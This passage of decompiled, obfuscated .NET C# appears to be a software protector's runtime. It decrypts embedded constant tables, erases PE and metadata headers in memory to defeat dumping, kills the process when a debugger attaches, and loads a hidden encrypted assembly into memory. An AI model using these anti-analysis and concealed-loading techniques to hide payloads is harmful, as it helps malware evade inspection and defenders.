			2422859398u, 2446025736u, 3208677997u, 1709509892u, 1623046194u, 1825119502u, 1345343983u, 2780872909u, 324859371u, 2481229934u,
			2042255215u, 940870431u, 3360260703u, 229761176u, 475933657u, 543379251u, 3604051107u, 663422681u, 4132154691u, 743561642u,
			9068175u, 3327184344u, 939464924u, 2115737895u, 1813528431u, 2542272941u, 4232849318u, 248339906u, 2688369990u, 1981024318u,
			3331982466u, 3465508547u, 4021370259u, 3593395345u, 4041718063u, 3567276968u, 2885426750u, 534503623u, 3783507950u, 1427772674u,
			2564791089u, 3310778176u, 687761977u, 2227063817u, 303073503u, 4005860540u, 215422578u, 2664986301u, 2389587993u, 1667316698u,
			2332428338u, 4008625945u, 3113839176u, 3661409966u, 4243745967u, 4250751978u, 4174494902u, 4155237517u, 3767922011u, 3086151378u,
			3342330779u, 706793114u, 3774195673u, 3762901548u, 720443844u, 673490518u, 1163738546u, 2486550037u, 485277008u, 1025191330u,
			3133706579u, 86206098u, 2758321824u, 4051809354u, 3920715061u, 132052862u, 2299067909u, 706793114u, 3774195673u, 3762901548u,
			720443844u, 673490518u
		};
		uint[] array2 = new uint[16];
		uint num2 = 2812069771u;
		for (int i = 0; i < 16; i++)
		{
			num2 ^= num2 >> 12;
			num2 ^= num2 << 25;
			num2 = (array2[i] = num2 ^ (num2 >> 27));
		}
		int j = 0;
		int num3 = 0;
		uint[] array3 = new uint[16];
		byte[] array4 = new byte[num * 4];
		for (; j < num; j += 16)
		{
			for (int k = 0; k < 16; k++)
			{
				array3[k] = array[j + k];
			}
			array3[0] = array3[0] ^ array2[0];
			array3[1] = array3[1] ^ array2[1];
			array3[2] = array3[2] ^ array2[2];
			array3[3] = array3[3] ^ array2[3];
			array3[4] = array3[4] ^ array2[4];
			array3[5] = array3[5] ^ array2[5];
			array3[6] = array3[6] ^ array2[6];
			array3[7] = array3[7] ^ array2[7];
			array3[8] = array3[8] ^ array2[8];
			array3[9] = array3[9] ^ array2[9];
			array3[10] = array3[10] ^ array2[10];
			array3[11] = array3[11] ^ array2[11];
			array3[12] = array3[12] ^ array2[12];
			array3[13] = array3[13] ^ array2[13];
			array3[14] = array3[14] ^ array2[14];
			array3[15] = array3[15] ^ array2[15];
			for (int l = 0; l < 16; l++)
			{
				uint num4 = array3[l];
				array4[num3++] = (byte)num4;
				array4[num3++] = (byte)(num4 >> 8);
				array4[num3++] = (byte)(num4 >> 16);
				array4[num3++] = (byte)(num4 >> 24);
				array2[l] ^= num4;
			}
		}
		byte_0 = smethod_1(array4);
		Module module = typeof(global::_003CModule_003E).Module;
		byte* ptr = (byte*)(void*)Marshal.GetHINSTANCE(module);
		byte* ptr2 = ptr + 60;
		ptr2 = ptr + (uint)(*(int*)ptr2);
		ptr2 += 6;
		ushort num5 = *(ushort*)ptr2;
		ptr2 += 14;
		ushort num6 = *(ushort*)ptr2;
		ptr2 = ptr2 + 4 + (int)num6;
		byte* ptr3 = stackalloc byte[11];
		MethodInfo lpflOldProtect;
		if (module.FullyQualifiedName[0] == '<')
		{
			uint num7 = *(uint*)(ptr2 - 16);
			uint num8 = *(uint*)(ptr2 - 120);
			uint[] array5 = new uint[num5];
			uint[] array6 = new uint[num5];
			uint[] array7 = new uint[num5];
			for (int m = 0; m < num5; m++)
			{
				VirtualProtect(ptr2, 8, 64u, out *(uint*)(&lpflOldProtect));
				Marshal.Copy(new byte[8], 0, (IntPtr)ptr2, 8);
				array5[m] = *(uint*)(ptr2 + 12);
				array6[m] = *(uint*)(ptr2 + 8);
				array7[m] = *(uint*)(ptr2 + 20);
				ptr2 += 40;
			}
			if (num8 != 0)
			{
				for (int n = 0; n < num5; n++)
				{
					if (array5[n] <= num8 && num8 < array5[n] + array6[n])
					{
						num8 = num8 - array5[n] + array7[n];
						break;
					}
				}
				byte* ptr4 = ptr + num8;
				uint num9 = *(uint*)ptr4;
				for (int num10 = 0; num10 < num5; num10++)
				{
					if (array5[num10] <= num9 && num9 < array5[num10] + array6[num10])
					{
						num9 = num9 - array5[num10] + array7[num10];
						break;
					}
				}
				byte* ptr5 = ptr + num9;
				uint num11 = *(uint*)(ptr4 + 12);
				for (int num12 = 0; num12 < num5; num12++)
				{
					if (array5[num12] <= num11 && num11 < array5[num12] + array6[num12])
					{
						num11 = num11 - array5[num12] + array7[num12];
						break;
					}
				}
				uint num13 = *(uint*)ptr5 + 2;
				for (int num14 = 0; num14 < num5; num14++)
				{
					if (array5[num14] <= num13 && num13 < array5[num14] + array6[num14])
					{
						num13 = num13 - array5[num14] + array7[num14];
						break;
					}
				}
				VirtualProtect(ptr + num11, 11, 64u, out *(uint*)(&lpflOldProtect));
				*(int*)ptr3 = 1818522734;
				*(int*)(ptr3 + 4) = 1818504812;
				*(short*)(ptr3 + 4L * 2L) = 108;
				ptr3[10] = 0;
				for (int num15 = 0; num15 < 11; num15++)
				{
					(ptr + num11)[num15] = ptr3[num15];
				}
				VirtualProtect(ptr + num13, 11, 64u, out *(uint*)(&lpflOldProtect));
				*(int*)ptr3 = 1866691662;
				*(int*)(ptr3 + 4) = 1852404846;
				*(short*)(ptr3 + 4L * 2L) = 25973;
				ptr3[10] = 0;
				for (int num16 = 0; num16 < 11; num16++)
				{
					(ptr + num13)[num16] = ptr3[num16];
				}
			}
			for (int num17 = 0; num17 < num5; num17++)
			{
				if (array5[num17] <= num7 && num7 < array5[num17] + array6[num17])
				{
					num7 = num7 - array5[num17] + array7[num17];
					break;
				}
			}
			byte* ptr6 = ptr + num7;
			VirtualProtect(ptr6, 72, 64u, out *(uint*)(&lpflOldProtect));
			uint num18 = *(uint*)(ptr6 + 8);
			for (int num19 = 0; num19 < num5; num19++)
			{
				if (array5[num19] <= num18 && num18 < array5[num19] + array6[num19])
				{
					num18 = num18 - array5[num19] + array7[num19];
					break;
				}
			}
			*(int*)ptr6 = 0;
			*(int*)(ptr6 + 4) = 0;
			*(int*)(ptr6 + 2L * 4L) = 0;
			*(int*)(ptr6 + 3L * 4L) = 0;
			byte* ptr7 = ptr + num18;
			VirtualProtect(ptr7, 4, 64u, out *(uint*)(&lpflOldProtect));
			*(int*)ptr7 = 0;
			ptr7 += 12;
			ptr7 += (uint)(*(int*)ptr7);
			ptr7 = (byte*)(((ulong)ptr7 + 7uL) & 0xFFFFFFFFFFFFFFFCuL);
			ptr7 += 2;
			ushort num20 = *ptr7;
			ptr7 += 2;
			for (int num21 = 0; num21 < num20; num21++)
			{
				VirtualProtect(ptr7, 8, 64u, out *(uint*)(&lpflOldProtect));
				ptr7 += 4;
				ptr7 += 4;
				for (int num22 = 0; num22 < 8; num22++)
				{
					VirtualProtect(ptr7, 4, 64u, out *(uint*)(&lpflOldProtect));
					*ptr7 = 0;
					ptr7++;
					if (*ptr7 != 0)
					{
						*ptr7 = 0;
						ptr7++;
						if (*ptr7 != 0)
						{
							*ptr7 = 0;
							ptr7++;
							if (*ptr7 != 0)
							{
								*ptr7 = 0;
								ptr7++;
								continue;
							}
							ptr7++;
							break;
						}
						ptr7 += 2;
						break;
					}
					ptr7 += 3;
					break;
				}
			}
		}
		else
		{
			byte* ptr8 = ptr + (uint)(*(int*)(ptr2 - 16));
			if (*(uint*)(ptr2 - 120) != 0)
			{
				byte* ptr9 = ptr + (uint)(*(int*)(ptr2 - 120));
				byte* ptr10 = ptr + (uint)(*(int*)ptr9);
				byte* ptr11 = ptr + (uint)(*(int*)(ptr9 + 12));
				byte* ptr12 = ptr + (uint)(*(int*)ptr10) + 2;
				VirtualProtect(ptr11, 11, 64u, out *(uint*)(&lpflOldProtect));
				*(int*)ptr3 = 1818522734;
				*(int*)(ptr3 + 4) = 1818504812;
				*(short*)(ptr3 + 4L * 2L) = 108;
				ptr3[10] = 0;
				for (int num23 = 0; num23 < 11; num23++)
				{
					ptr11[num23] = ptr3[num23];
				}
				VirtualProtect(ptr12, 11, 64u, out *(uint*)(&lpflOldProtect));
				*(int*)ptr3 = 1866691662;
				*(int*)(ptr3 + 4) = 1852404846;
				*(short*)(ptr3 + 4L * 2L) = 25973;
				ptr3[10] = 0;
				for (int num24 = 0; num24 < 11; num24++)
				{
					ptr12[num24] = ptr3[num24];
				}
			}
			for (int num25 = 0; num25 < num5; num25++)
			{
				VirtualProtect(ptr2, 8, 64u, out *(uint*)(&lpflOldProtect));
				Marshal.Copy(new byte[8], 0, (IntPtr)ptr2, 8);
				ptr2 += 40;
			}
			VirtualProtect(ptr8, 72, 64u, out *(uint*)(&lpflOldProtect));
			byte* ptr13 = ptr + (uint)(*(int*)(ptr8 + 8));
			*(int*)ptr8 = 0;
			*(int*)(ptr8 + 4) = 0;
			*(int*)(ptr8 + 2L * 4L) = 0;
			*(int*)(ptr8 + 3L * 4L) = 0;
			VirtualProtect(ptr13, 4, 64u, out *(uint*)(&lpflOldProtect));
			*(int*)ptr13 = 0;
			ptr13 += 12;
			ptr13 += (uint)(*(int*)ptr13);
			ptr13 = (byte*)(((ulong)ptr13 + 7uL) & 0xFFFFFFFFFFFFFFFCuL);
			ptr13 += 2;
			ushort num26 = *ptr13;
			ptr13 += 2;
			for (int num27 = 0; num27 < num26; num27++)
			{
				VirtualProtect(ptr13, 8, 64u, out *(uint*)(&lpflOldProtect));
				ptr13 += 4;
				ptr13 += 4;
				for (int num28 = 0; num28 < 8; num28++)
				{
					VirtualProtect(ptr13, 4, 64u, out *(uint*)(&lpflOldProtect));
					*ptr13 = 0;
					ptr13++;
					if (*ptr13 != 0)
					{
						*ptr13 = 0;
						ptr13++;
						if (*ptr13 != 0)
						{
							*ptr13 = 0;
							ptr13++;
							if (*ptr13 != 0)
							{
								*ptr13 = 0;
								ptr13++;
								continue;
							}
							ptr13++;
							break;
						}
						ptr13 += 2;
						break;
					}
					ptr13 += 3;
					break;
				}
			}
		}
		lpflOldProtect = typeof(Environment).GetMethod(smethod_2<string>(-728808422), new Type[1] { typeof(string) });
		if ((object)lpflOldProtect != null && smethod_3<string>(1958926128).Equals(lpflOldProtect.Invoke(null, new object[1] { smethod_4<string>(-2017713414) })))
		{
			Environment.FailFast(null);
		}
		Thread thread = new Thread(smethod_0);
		thread.IsBackground = true;
		thread.Start(null);
	}

	private static void smethod_0(object thread)
	{
		Thread thread2 = thread as Thread;
		if (thread2 == null)
		{
			thread2 = new Thread(smethod_0);
			thread2.IsBackground = true;
			thread2.Start(Thread.CurrentThread);
			Thread.Sleep(500);
		}
		while (true)
		{
			if (Debugger.IsAttached || Debugger.IsLogging())
			{
				Environment.FailFast(null);
			}
			if (!thread2.IsAlive)
			{
				Environment.FailFast(null);
			}
			Thread.Sleep(1000);
		}
	}

	[DllImport("kernel32.dll")]
	internal unsafe static extern bool VirtualProtect(byte* lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);

	internal static byte[] smethod_1(byte[] data)
	{
		MemoryStream memoryStream = new MemoryStream(data);
		Class1 @class = new Class1();
		byte[] array = new byte[5];
		for (int i = 0; i < 5; i += memoryStream.Read(array, i, 5 - i))
		{
		}
		@class.method_5(array);
		for (int i = 0; i < 4; i += memoryStream.Read(array, i, 4 - i))
		{
		}
		if (!BitConverter.IsLittleEndian)
		{
			Array.Reverse(array, 0, 4);
		}
		int num = BitConverter.ToInt32(array, 0);
		byte[] array2 = new byte[num];
		MemoryStream outStream = new MemoryStream(array2, true);
		long inSize = memoryStream.Length - 5L - 4L;
		@class.method_4(memoryStream, outStream, inSize, num);
		return array2;
	}

	internal static T smethod_2<T>(int id)
	{
		if (Assembly.GetExecutingAssembly().Equals(Assembly.GetCallingAssembly()))
		{
			id = (id * 2099881079) ^ 0x30635016;
			int num = (int)((uint)id >> 30);
			id = (id & 0x3FFFFFFF) << 2;
			switch (num)
			{
			case 3:
			{
				int num2 = byte_0[id] | (byte_0[id + 1] << 8) | (byte_0[id + 2] << 16) | (byte_0[id + 3] << 24);
				int length = byte_0[id + 4] | (byte_0[id + 5] << 8) | (byte_0[id + 6] << 16) | (byte_0[id + 7] << 24);
				Array array2 = Array.CreateInstance(typeof(T).GetElementType(), length);
				Buffer.BlockCopy(byte_0, id + 8, array2, 0, num2 - 4);
				return (T)(object)array2;
			}
			default:
				return default(T);
			case 1:
			{
				T[] array = new T[1];
				Buffer.BlockCopy(byte_0, id, array, 0, System.Runtime.CompilerServices.Unsafe.SizeOf<T>());
				return array[0];
			}
			case 0:
			{
				int count = byte_0[id] | (byte_0[id + 1] << 8) | (byte_0[id + 2] << 16) | (byte_0[id + 3] << 24);
				return (T)(object)string.Intern(Encoding.UTF8.GetString(byte_0, id + 4, count));
			}
			}
		}
		return default(T);
	}

	internal static T smethod_3<T>(int id)
	{
		if (Assembly.GetExecutingAssembly().Equals(Assembly.GetCallingAssembly()))
		{
			id = (id * 1838926581) ^ -162279177;
			int num = (int)((uint)id >> 30);
			id = (id & 0x3FFFFFFF) << 2;
			switch (num)
			{
			case 3:
			{
				int count = byte_0[id] | (byte_0[id + 1] << 8) | (byte_0[id + 2] << 16) | (byte_0[id + 3] << 24);
				return (T)(object)string.Intern(Encoding.UTF8.GetString(byte_0, id + 4, count));
			}
			default:
				return default(T);
			case 2:
			{
				int num2 = byte_0[id] | (byte_0[id + 1] << 8) | (byte_0[id + 2] << 16) | (byte_0[id + 3] << 24);
				int length = byte_0[id + 4] | (byte_0[id + 5] << 8) | (byte_0[id + 6] << 16) | (byte_0[id + 7] << 24);
				Array array2 = Array.CreateInstance(typeof(T).GetElementType(), length);
				Buffer.BlockCopy(byte_0, id + 8, array2, 0, num2 - 4);
				return (T)(object)array2;
			}
			case 0:
			{
				T[] array = new T[1];
				Buffer.BlockCopy(byte_0, id, array, 0, System.Runtime.CompilerServices.Unsafe.SizeOf<T>());
				return array[0];
			}
			}
		}
		return default(T);
	}

	internal static T smethod_4<T>(int id)
	{
		if (Assembly.GetExecutingAssembly().Equals(Assembly.GetCallingAssembly()))
		{
			id = (id * -1818047127) ^ -1000306045;
			int num = (int)((uint)id >> 30);
			id = (id & 0x3FFFFFFF) << 2;
			switch (num)
			{
			case 0:
			{
				T[] array2 = new T[1];
				Buffer.BlockCopy(byte_0, id, array2, 0, System.Runtime.CompilerServices.Unsafe.SizeOf<T>());
				return array2[0];
			}
			default:
				return default(T);
			case 2:
			{
				int num2 = byte_0[id] | (byte_0[id + 1] << 8) | (byte_0[id + 2] << 16) | (byte_0[id + 3] << 24);
				int length = byte_0[id + 4] | (byte_0[id + 5] << 8) | (byte_0[id + 6] << 16) | (byte_0[id + 7] << 24);
				Array array = Array.CreateInstance(typeof(T).GetElementType(), length);
				Buffer.BlockCopy(byte_0, id + 8, array, 0, num2 - 4);
				return (T)(object)array;
			}
			case 3:
			{
				int count = byte_0[id] | (byte_0[id + 1] << 8) | (byte_0[id + 2] << 16) | (byte_0[id + 3] << 24);
				return (T)(object)string.Intern(Encoding.UTF8.GetString(byte_0, id + 4, count));
			}
			}
		}
		return default(T);
	}

	internal static T smethod_5<T>(int id)
	{
		if (Assembly.GetExecutingAssembly().Equals(Assembly.GetCallingAssembly()))
		{
			id = (id * 804708637) ^ -112435054;
			int num = (int)((uint)id >> 30);
			id = (id & 0x3FFFFFFF) << 2;
			switch (num)
			{
			case 1:
			{
				int count = byte_0[id] | (byte_0[id + 1] << 8) | (byte_0[id + 2] << 16) | (byte_0[id + 3] << 24);
				return (T)(object)string.Intern(Encoding.UTF8.GetString(byte_0, id + 4, count));
			}
			case 3:
			{
				int num2 = byte_0[id] | (byte_0[id + 1] << 8) | (byte_0[id + 2] << 16) | (byte_0[id + 3] << 24);
				int length = byte_0[id + 4] | (byte_0[id + 5] << 8) | (byte_0[id + 6] << 16) | (byte_0[id + 7] << 24);
				Array array2 = Array.CreateInstance(typeof(T).GetElementType(), length);
				Buffer.BlockCopy(byte_0, id + 8, array2, 0, num2 - 4);
				return (T)(object)array2;
			}
			default:
				return default(T);
			case 2:
			{
				T[] array = new T[1];
				Buffer.BlockCopy(byte_0, id, array, 0, System.Runtime.CompilerServices.Unsafe.SizeOf<T>());
				return array[0];
			}
			}
		}
		return default(T);
	}

	internal static T smethod_6<T>(int id)
	{
		if (Assembly.GetExecutingAssembly().Equals(Assembly.GetCallingAssembly()))
		{
			id = (id * 1054560531) ^ -945124803;
			int num = (int)((uint)id >> 30);
			id = (id & 0x3FFFFFFF) << 2;
			switch (num)
			{
			case 3:
			{
				int count = byte_0[id] | (byte_0[id + 1] << 8) | (byte_0[id + 2] << 16) | (byte_0[id + 3] << 24);
				return (T)(object)string.Intern(Encoding.UTF8.GetString(byte_0, id + 4, count));
			}
			case 2:
			{
				T[] array2 = new T[1];
				Buffer.BlockCopy(byte_0, id, array2, 0, System.Runtime.CompilerServices.Unsafe.SizeOf<T>());
				return array2[0];
			}
			case 0:
			{
				int num2 = byte_0[id] | (byte_0[id + 1] << 8) | (byte_0[id + 2] << 16) | (byte_0[id + 3] << 24);
				int length = byte_0[id + 4] | (byte_0[id + 5] << 8) | (byte_0[id + 6] << 16) | (byte_0[id + 7] << 24);
				Array array = Array.CreateInstance(typeof(T).GetElementType(), length);
				Buffer.BlockCopy(byte_0, id + 8, array, 0, num2 - 4);
				return (T)(object)array;
			}
			default:
				return default(T);
			}
		}
		return default(T);
	}

	internal static void smethod_7()
	{
		uint num = 768u;
		uint[] array = new uint[768]
		{
			1612717582u, 1174871899u, 369307251u, 589389778u, 623207089u, 2396752811u, 828408184u, 1876408620u, 3408079431u, 2666212515u,
			148515500u, 1000477496u, 945551289u, 1086909225u, 235102304u, 1038487585u, 1120654885u, 3158761758u, 1686927296u, 1285641942u,
			3766161035u, 638029567u, 1835700319u, 3599120051u, 3939717115u, 1639561151u, 383639890u, 1387368465u, 3593530850u, 1224095326u,
			3582934085u, 2696621442u, 166439711u, 2952629351u, 134687958u, 240660577u, 2987944513u, 907264347u, 665153801u, 1262772070u,
			1876389952u, 1685502522u, 186601408u, 4056475075u, 2663552664u, 1226730470u, 1181895455u, 2785277261u, 2442679943u, 2316067344u,
			2726347364u, 3548428721u, 3959016316u, 379070021u, 2065973009u, 1699825379u, 2471154599u, 2118246057u, 2611272205u, 953368329u,
			1864467608u, 1322951068u, 755597383u, 2666951581u, 2727196936u, 3948678821u, 2188679993u, 72351828u, 4281479802u, 2212386852u,
			2172533360u, 3512660367u, 1069791095u, 2558974119u, 2411681508u, 4286638578u, 2137903342u, 3086788888u, 2855944887u, 4105378506u,
			2622070611u, 1878155462u, 770610192u, 4283692947u, 4041446240u, 4145808144u, 4242898634u, 2657497703u, 1536546106u, 4091222677u,
			519412408u, 4291751409u, 2003256139u, 1700799168u, 169961151u, 4200642889u, 3520568835u, 2570418941u, 752682469u, 1455174114u,
			1599869366u, 557978692u, 3430705752u, 510584604u, 2184147098u, 3158626131u, 1523939496u, 869975297u, 397536753u, 2777899094u,
			4029785749u, 2515140409u, 1120003860u, 353425621u, 11936206u, 3476899916u, 287543097u, 2789504365u, 3554459747u, 1031256627u,
			1749859342u, 195997709u, 3573998970u, 1366773776u, 1433135257u, 3148319131u, 2788288225u, 1053743560u, 3991850320u, 2600951260u,
			302432933u, 2324975947u, 3201443415u, 2702482541u, 3594548777u, 4200527309u, 2118049827u, 1977319980u, 42368251u, 1287922499u,
			3399810016u, 2455368338u, 3349199383u, 1112342329u, 763466925u, 3677143812u, 3071691982u, 2563068255u, 2702998703u, 3252549056u,
			2616562234u, 2790301654u, 845569189u, 2780135765u, 2479794565u, 3590776144u, 690335712u, 2524499773u, 3803795690u, 3530262296u,
			1747141721u, 3918098835u, 3593180931u, 3952819369u, 137282858u, 1246106235u, 2421782325u, 4167307652u, 4155566388u, 981760815u,
			398343531u, 1177677493u, 3432410812u, 786431335u, 2046821197u, 1528957759u, 453170199u, 1457972807u, 231303373u, 2401945983u,
			3948200399u, 739594517u, 909135527u, 2043320429u, 13529332u, 2752555431u, 2395877041u, 1372336799u, 425057121u, 1011318534u,
			3168101910u, 2989788763u, 1216820558u, 4067352487u, 2216492701u, 2629279472u, 3355401011u, 2091580873u, 2021432022u, 2948786404u,
			3086025823u, 596098984u, 1190842833u, 3090064658u, 4276214609u, 3355847092u, 3974580636u, 3448038357u, 1321360353u, 1238211257u,
			1013229362u, 3634745454u, 133553420u, 3404811644u, 1666636032u, 1598455832u, 4062497383u, 1834173565u, 2965327515u, 4171436716u,
			444611284u, 3405781965u, 292937371u, 351384219u, 3840224519u, 976222826u, 2136810738u, 87383144u, 1527730492u, 469331241u,
			474946843u, 3606039187u, 1430134809u, 2616792843u, 1500991763u, 4098375568u, 4176906904u, 701507898u, 323472139u, 373905211u,
			2877364122u, 3289096653u, 3743891719u, 2340081205u, 4123021336u, 2357134912u, 2733197224u, 131493367u, 2824886789u, 2663233962u,
			550019431u, 3535099268u, 3845989015u, 1291537581u, 3493188432u, 3797235560u, 1508427242u, 514361094u, 3164433186u, 844773168u,
			2325441041u, 784966139u, 2156098377u, 2233996330u, 3626150522u, 3532464903u, 2024019331u, 1880412130u, 2718000388u, 2066702718u,
			3709707772u, 2421105895u, 945867794u, 682202463u, 574752316u, 1655717509u, 2098699673u, 1376479695u, 920052367u, 4204925527u,
			1092865232u, 1690354022u, 1366514109u, 2271355900u, 1329198082u, 19738417u, 3544130056u, 3691705972u, 4230466437u, 77643681u,
			1016748292u, 2475647294u, 2992991991u, 2236381270u, 2535070575u, 1966857519u, 1088454798u, 3674159958u, 3139025399u, 3253798703u,
			1259673295u, 1697037051u, 2194068311u, 1062783784u, 3128147548u, 1654331237u, 2332307321u, 436931294u, 3506564889u, 3530043198u,
			1891823345u, 1278960455u, 1659288469u, 1369108021u, 2726092817u, 1164781094u, 1296212391u, 214569833u, 3482425533u, 430933270u,
			3972591006u, 1040637295u, 3294944794u, 4277727988u, 114875432u, 1383307723u, 1734789488u, 3744216500u, 2702884322u, 2556283991u,
			3239483830u, 3188550222u, 2529589389u, 1867692590u, 1365140191u, 1641117955u, 2745874087u, 460741699u, 4002216699u, 2825140072u,
			1239216515u, 1326050572u, 569507111u, 2726605437u, 1990154765u, 3066297180u, 116022867u, 2160109625u, 598486822u, 125884178u,
			3252520761u, 2902604118u, 1442055604u, 3186810197u, 672134719u, 3455382522u, 452051982u, 1587172618u, 679683135u, 1451342329u,
			744926849u, 3014832887u, 413850062u, 3842850452u, 728429293u, 3333757816u, 722765754u, 2520047213u, 9195156u, 473031121u,
			1861490844u, 79023232u, 2108077467u, 756672441u, 3621958737u, 356016048u, 705938877u, 2140725990u, 2360528567u, 290985160u,
			2562871055u, 3226134660u, 3983166947u, 466224886u, 2334940601u, 2095494522u, 1564964901u, 398426237u, 1734894934u, 3440949023u,
			3517363550u, 1491877776u, 2317884652u, 3899965661u, 2734341284u, 1524554825u, 3800839805u, 2590134281u, 1969528987u, 2574720547u,
			163221957u, 2017166519u, 3744098676u, 1559757877u, 1703680424u, 1417735202u, 3502388634u, 3757583574u, 431419142u, 514262396u,
			2199700368u, 2508837891u, 1164800639u, 2618097137u, 2028318817u, 644013048u, 2482107699u, 1137876903u, 4132671070u, 4051632316u,
			3635541027u, 4111702233u, 159735217u, 2963169652u, 1151824444u, 1153088097u, 520092294u, 2013702004u, 2787393829u, 1622845459u,
			1150685385u, 2748685477u, 2600203412u, 1389492022u, 834043333u, 2559109804u, 2681510309u, 1626505056u, 3780820022u, 3241889599u,
			2836905636u, 439292319u, 2474454333u, 1139681317u, 3027509453u, 3883511225u, 3110118905u, 3870695748u, 699655600u, 2638900805u,
			1860475123u, 1582759000u, 788405706u, 2892178749u, 3915882305u, 3557835382u, 2266821170u, 1077818585u, 2900391227u, 3398674774u,
			163630881u, 1063349940u, 4168282323u, 3024462674u, 2392536639u, 1850381312u, 3624573903u, 2058158489u, 1690427349u, 3188260097u,
			3879512772u, 2116937919u, 1673528273u, 3931745770u, 3058837260u, 1947412313u, 1557363497u, 2158818745u, 1732940370u, 3235481472u,
			1593890751u, 462124134u, 1527616976u, 352778972u, 122007090u, 1987000164u, 1366755429u, 3659279493u, 4116477264u, 2038637798u,
			3667933341u, 3289899358u, 3687282083u, 2713286271u, 1404342455u, 2687919900u, 14823240u, 2639447792u, 3873267878u, 273222558u,
			3746302900u, 3890036398u, 436138530u, 1916535436u, 1608104476u, 430178019u, 286996660u, 1254542033u, 1221255139u, 495625461u,
			2188736256u, 3348332421u, 1800060015u, 3734732261u, 2600001954u, 1107360948u, 2191723200u, 1447298556u, 2560981366u, 352278426u,
			1931272679u, 2043340287u, 3178165347u, 4245584082u, 2286748325u, 1711212780u, 303780456u, 1937448278u, 4216511173u, 442409886u,
			935696214u, 25889072u, 2052404768u, 3752248289u, 1155516368u, 307732500u, 3605339592u, 651055134u, 2632336065u, 1448961640u,
			1667787134u, 2993658468u, 223770651u, 3213448265u, 172187594u, 2632382556u, 2429419662u, 2435657697u, 540504148u, 4237430335u,
			344378115u, 2280347118u, 105478301u, 1975605836u, 4151954865u, 1632184538u, 1038446042u, 2428017832u, 2639396857u, 3068549472u,
			3877525002u, 4123742297u, 2374523081u, 1394330569u, 1826644641u, 395749384u, 4249556732u, 1723414153u, 591774281u, 3783424514u,
			3600818757u, 3487038385u, 3506948314u, 3346372261u, 2927310247u, 1628901423u, 3667884485u, 1657080143u, 4111474946u, 3583511920u,
			2197177663u, 2965355896u, 1707736947u, 2228839609u, 1314508241u, 1215916417u, 730325185u, 3725961227u, 4250263072u, 425695277u,
			1024856195u, 3400266224u, 1218956301u, 2815276270u, 321277586u, 2871227868u, 3419590603u, 75336490u, 1976766613u, 1638278190u,
			2810138161u, 2551122096u, 1589975250u, 1418494086u, 556030605u, 2845271695u, 747423584u, 1572236890u, 3864296104u, 3055951969u,
			2579528462u, 849987856u, 646692815u, 338722321u, 1197874784u, 1578961254u, 2482667297u, 728567036u, 4242822991u, 2812057036u,
			3453201114u, 1215134209u, 2052524620u, 3327328874u, 177760222u, 3499710778u, 3467302382u, 5300089u, 3224045253u, 373377390u,
			227320980u, 3402352948u, 12099532u, 2482449091u, 2522558980u, 982134581u, 2918399926u, 3091777331u, 76267880u, 3244358065u,
			3804087412u, 1096733257u, 1142348897u, 41513260u, 1370574075u, 4165270322u, 3207251434u, 877668496u, 2630281243u, 1753310395u,
			1823246996u, 2716480383u, 3500121925u, 2375861576u, 3118547836u, 2817197274u, 739906728u, 2076324415u, 2609240775u, 3301085928u,
			2008963932u, 3036056602u, 2265118699u, 143740258u, 2160843801u, 4226453103u, 1256714155u, 1408284149u, 3520991259u, 162978975u,
			3348547738u, 1906564898u, 1828671519u, 1208277909u, 2903968502u, 70287709u, 1333484035u, 2755311786u, 3770214852u, 2353030365u,
			4083643085u, 3615031378u, 1490522380u, 1502238239u, 3314736721u, 2440942214u, 2553579604u, 78223478u, 98948654u, 2638546919u,
			3012319123u, 3154367999u, 2047162959u, 3515730685u, 4227479296u, 2394178673u, 3004142717u, 1234898914u, 1607191915u, 1555591886u,
			3800151995u, 1855909467u, 3525266292u, 3687339929u, 2319050161u, 2062874381u, 3279175925u, 2455546852u, 1078106803u, 4268106756u,
			2671549920u, 352812089u, 357036873u, 2765707968u, 834719871u, 4264584485u, 2805616884u, 3532191862u, 2849909228u, 4159815159u,
			1953531789u, 2520414705u, 1201037031u, 3020875049u, 4238366618u, 2256563027u, 3961740654u, 232835722u, 2083791784u, 2572985783u,
			140545884u, 2852695686u, 4096050425u, 2938815518u, 2301069970u, 1429646775u, 568263200u, 311383802u, 1593858161u, 2308325134u,
			3226082620u, 841368277u, 1623344843u, 3439895851u, 4011122296u, 318990669u, 3250143836u, 394891388u, 606561470u, 2494101148u,
			3879894253u, 3300066691u, 1187715040u, 311377828u, 1593858161u, 2308325134u, 3226082620u, 841368277u, 1623344843u, 3439895851u,
			4011122296u, 318990669u, 3250143836u, 394891388u, 606561470u, 2494101148u, 3879894253u, 3300066691u
		};
		uint[] array2 = new uint[16];
		uint num2 = 2116284240u;
		for (int i = 0; i < 16; i++)
		{
			num2 ^= num2 >> 13;
			num2 ^= num2 << 25;
			num2 = (array2[i] = num2 ^ (num2 >> 27));
		}
		int j = 0;
		int num3 = 0;
		uint[] array3 = new uint[16];
		byte[] array4 = new byte[num * 4];
		for (; j < num; j += 16)
		{
			for (int k = 0; k < 16; k++)
			{
				array3[k] = array[j + k];
			}
			array3[0] = array3[0] ^ array2[0];
			array3[1] = array3[1] ^ array2[1];
			array3[2] = array3[2] ^ array2[2];
			array3[3] = array3[3] ^ array2[3];
			array3[4] = array3[4] ^ array2[4];
			array3[5] = array3[5] ^ array2[5];
			array3[6] = array3[6] ^ array2[6];
			array3[7] = array3[7] ^ array2[7];
			array3[8] = array3[8] ^ array2[8];
			array3[9] = array3[9] ^ array2[9];
			array3[10] = array3[10] ^ array2[10];
			array3[11] = array3[11] ^ array2[11];
			array3[12] = array3[12] ^ array2[12];
			array3[13] = array3[13] ^ array2[13];
			array3[14] = array3[14] ^ array2[14];
			array3[15] = array3[15] ^ array2[15];
			for (int l = 0; l < 16; l++)
			{
				uint num4 = array3[l];
				array4[num3++] = (byte)num4;
				array4[num3++] = (byte)(num4 >> 8);
				array4[num3++] = (byte)(num4 >> 16);
				array4[num3++] = (byte)(num4 >> 24);
				array2[l] ^= num4;
			}
		}
		assembly_0 = Assembly.Load(smethod_1(array4));
		AppDomain.CurrentDomain.AssemblyResolve += smethod_8;
	}

	internal static Assembly smethod_8(object sender, ResolveEventArgs args)
	{
		if (assembly_0.FullName == args.Name)
		{
			return assembly_0;
		}
		return null;
	}

	[DllImport("kernel32.dll", EntryPoint = "VirtualProtect")]
	internal static extern bool VirtualProtect_1(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

	internal unsafe static void smethod_9()
	{
		Module module = typeof(global::_003CModule_003E).Module;
		string fullyQualifiedName = module.FullyQualifiedName;
